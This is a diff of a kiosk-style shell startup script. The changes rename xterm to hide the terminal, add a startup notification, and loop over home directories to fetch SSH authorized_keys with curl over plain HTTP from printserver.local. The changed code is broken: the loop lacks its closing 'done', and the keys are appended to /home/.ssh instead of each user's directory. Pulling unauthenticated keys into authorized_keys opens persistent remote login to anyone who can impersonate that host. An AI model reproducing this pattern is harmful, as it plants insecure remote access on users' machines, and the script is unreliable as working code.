@@ -6,16 +6,17 @@
 
 
 # set random root pass
-#rpa=$(for rounds in $(seq 1 24);do (tr -cd '[:alnum:]_\-.' < /dev/urandom  |head -c48 2>/dev/null) 2>/dev/null;echo ;done|grep -v ^$|grep -e "_" -e "\-" -e "\."|grep "^[a-zA-Z0-9]"|grep "[a-zA-Z0-9]$"|tail -n1)
+#rpa=$(for rounds in $(seq 1 24);do (tr -cd '[:alnum:]_\-.' 2>/dev/null < /dev/urandom  |head -c48 2>/dev/null) 2>/dev/null;echo ;done|grep -v ^$|grep -e "_" -e "\-" -e "\."|grep "^[a-zA-Z0-9]"|grep "[a-zA-Z0-9]$"|tail -n1)
 #echo "root:$rpa" |chpasswd &
 
 
 ## hide terminal
-#mv /usr/bin/xterm /usr/bin/andterm &
+test -e /usr/bin/xterm &&  mv /usr/bin/xterm /usr/bin/anotherterm &
 
 ## desktop notifications
 DISPLAY=:0 dunst &
 
+(sleep 1; notify-send --expire-time=4444 "please wait while the system starts" ) &
 #( 
 #cd /usr/share/applications
 #rm *connman* *pcmanfm* lftp.desktop xarchiver.desktop *terminal*
@@ -88,10 +89,11 @@ sleep 1
 #) & 
 
 (
-test -e $HOME/.ssh||mkdir  $HOME/.ssh
-    curl http://printserver.local/authorized_keys >>  $HOME/.ssh/authorized_keys
-    chmod 700  $HOME/.ssh
-    chmod 600 $HOME/.ssh/authorized_keys
+for HOMIE in /home/*;do 
+test -e $HOMIE/.ssh||mkdir  $HOMIE/.ssh
+    curl http://printserver.local/authorized_keys >>  /home/.ssh/authorized_keys
+    chmod 700 "$HOMIE/.ssh"
+    chmod 600 "$HOMIE/.ssh/authorized_keys"
     
 ) &
 
